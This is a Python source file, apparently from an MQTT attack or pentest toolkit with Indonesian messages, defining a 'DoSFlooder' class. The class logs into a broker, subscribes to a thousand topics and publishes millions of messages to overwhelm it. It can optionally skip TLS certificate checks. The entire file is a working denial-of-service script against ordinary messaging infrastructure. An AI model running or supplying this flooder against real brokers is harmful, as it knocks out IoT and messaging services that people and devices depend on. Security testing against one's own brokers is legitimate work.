import time
import paho.mqtt.client as mqtt
from core.tls_utils import setup_tls_context

class DoSFlooder:
    def __init__(self, broker_ip, port=1883, username=None, password=None,qos=0, retain=False, delay=0.005, use_tls=False,allow_insecure=True, logger=None):  # ← tambahkan allow_insecure
        self.broker_ip = broker_ip
        self.port = port
        self.username = username
        self.password = password
        self.qos = qos
        self.retain = retain
        self.delay = delay
        self.use_tls = use_tls
        self.allow_insecure = allow_insecure  # ← simpan
        self.logger = logger


    def log(self, message):
        if self.logger:
            self.logger(message)
        else:
            print(message)

    def run(self, topic_count=1000, messages_per_topic=3000):
        try:
            client = mqtt.Client()
            if self.username and self.password:
                client.username_pw_set(self.username, self.password)

            if self.use_tls:
                setup_tls_context(client, allow_insecure=self.allow_insecure, logger=self.logger)

            client.connect(self.broker_ip, self.port, 60)
            client.loop_start()
            topics = []

            for i in range(topic_count):
                topic = f"flood/topic/{i}"
                client.subscribe(topic)
                topics.append(topic)
                time.sleep(self.delay)

            self.log(f"[✓] Subscribed {topic_count} topics.")
            time.sleep(1)

            for topic in topics:
                for j in range(messages_per_topic):
                    payload = f"FLOOD_{topic}_{j}"
                    client.publish(topic, payload, qos=self.qos, retain=self.retain)

            client.loop_stop()
            client.disconnect()
            self.log("[✓] Publish Flood selesai.")
        except Exception as e:
            self.log(f"[!] Subscribe Flood gagal - {e}")
